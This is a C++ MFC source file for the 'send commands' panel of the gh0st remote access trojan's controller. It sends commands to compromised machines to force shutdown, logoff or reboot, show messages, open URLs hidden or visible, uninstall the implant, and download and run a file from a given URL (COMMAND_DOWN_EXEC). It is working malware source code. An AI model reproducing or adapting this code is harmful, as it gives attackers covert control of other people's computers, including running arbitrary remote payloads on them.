// SEND.cpp : implementation file
//

#include "stdafx.h"
#include "gh0st.h"
#include "SEND.h"
#include "PcView.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

#include "resource.h"

extern CPcView* g_pConnectView;
/////////////////////////////////////////////////////////////////////////////
// CSEND

IMPLEMENT_DYNCREATE(CSEND, CFormView)

CSEND::CSEND()
	: CFormView(CSEND::IDD)
{
	//{{AFX_DATA_INIT(CSEND)
	//}}AFX_DATA_INIT
}

CSEND::~CSEND()
{
}

void CSEND::DoDataExchange(CDataExchange* pDX)
{
	CFormView::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CSEND)
	DDX_Control(pDX, IDC_OPEN_KIND, m_open_kinds);
	DDX_Control(pDX, IDC_OPEN_ADDRESS, m_open);
	DDX_Control(pDX, IDC_DOWN_ADDRESS, m_down);
	DDX_Control(pDX, IDC_EDIT_MSG, m_msg);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CSEND, CFormView)
	//{{AFX_MSG_MAP(CSEND)
	ON_BN_CLICKED(IDC_MSG, OnMsg)
	ON_BN_CLICKED(IDM_SHUTDOWN, OnShutdown)
	ON_BN_CLICKED(IDM_LOGOFF, OnLogoff)
	ON_BN_CLICKED(IDM_REBOOT, OnReboot)
	ON_BN_CLICKED(IDM_REMOVE, OnRemove)
	ON_BN_CLICKED(IDC_OPEN, OnOpen)
	ON_BN_CLICKED(IDC_DOWN, OnDown)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CSEND diagnostics

#ifdef _DEBUG
void CSEND::AssertValid() const
{
	CFormView::AssertValid();
}

void CSEND::Dump(CDumpContext& dc) const
{
	CFormView::Dump(dc);
}
#endif //_DEBUG

/////////////////////////////////////////////////////////////////////////////
// CSEND message handlers
void CSEND::OnMsg() 
{
	// TODO: Add your control notification handler code here
	CString msg;
	m_msg.GetWindowText(msg);
	OutputDebugString(msg);
	int		nPacketLength = msg.GetLength() + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_SHOW_MSG;
	memcpy(lpPacket + 1, msg.GetBuffer(0), nPacketLength - 1);
	g_pConnectView->SendSelectCommand(lpPacket, nPacketLength);
	delete[] lpPacket;	
}

void CSEND::OnShutdown() 
{
	// TODO: Add your control notification handler code here
	BYTE bToken[2];
	bToken[0] = COMMAND_SESSION;
	bToken[1] = EWX_SHUTDOWN | EWX_FORCE;
	g_pConnectView->SendSelectCommand((LPBYTE)&bToken, sizeof(bToken));		
}

void CSEND::OnLogoff() 
{
	// TODO: Add your control notification handler code here
	BYTE bToken[2];
	bToken[0] = COMMAND_SESSION;
	bToken[1] = EWX_LOGOFF | EWX_FORCE;
	g_pConnectView->SendSelectCommand((LPBYTE)&bToken, sizeof(bToken));	
}

void CSEND::OnReboot() 
{
	// TODO: Add your control notification handler code here
	BYTE bToken[2];
	bToken[0] = COMMAND_SESSION;
	bToken[1] = EWX_REBOOT | EWX_FORCE;
	g_pConnectView->SendSelectCommand((LPBYTE)&bToken, sizeof(bToken));		
}

void CSEND::OnRemove() 
{
	// TODO: Add your control notification handler code here
	if (MessageBox(_T("确认卸载服务端吗 "), _T("Warning"), MB_YESNO | MB_ICONWARNING) == IDNO)
		return;
	BYTE	bToken = COMMAND_REMOVE;
	g_pConnectView->SendSelectCommand(&bToken, sizeof(BYTE));	
}

void CSEND::OnOpen() 
{
	// TODO: Add your control notification handler code here
	CString open,kind;
	m_open.GetWindowText(open);
	m_open_kinds.GetWindowText(kind);
	open.MakeLower();
	if (open.Find("http://") == -1)
	{
		MessageBox(_T("输入的网址不合法"), ("错误"));
		return;
	}
	
	int		nPacketLength = open.GetLength() + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	if (open.Find("隐藏") != -1)
	{
		lpPacket[0] = COMMAND_OPEN_URL_HIDE;
	} 
	else
	{
		lpPacket[0] = COMMAND_OPEN_URL_SHOW;

	}
	memcpy(lpPacket + 1, open.GetBuffer(0), nPacketLength - 1);
	
	g_pConnectView->SendSelectCommand(lpPacket, nPacketLength);
	
	delete[] lpPacket;	

}

void CSEND::OnDown() 
{
	// TODO: Add your control notification handler code here
	CString down;
	m_down.GetWindowText(down);
	down.MakeLower();
	if (down.Find("http://") == -1)
	{
		MessageBox("输入的网址不合法", "错误");
		return;
	}
	
	int		nPacketLength = down.GetLength() + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_DOWN_EXEC;
	memcpy(lpPacket + 1, down.GetBuffer(0), nPacketLength - 1);
	
	g_pConnectView->SendSelectCommand(lpPacket, nPacketLength);
	
	delete[] lpPacket;	
}

void CSEND::OnInitialUpdate() 
{
	CFormView::OnInitialUpdate();
	
	// TODO: Add your specialized code here and/or call the base class
	m_open_kinds.SetCurSel(0);	
}
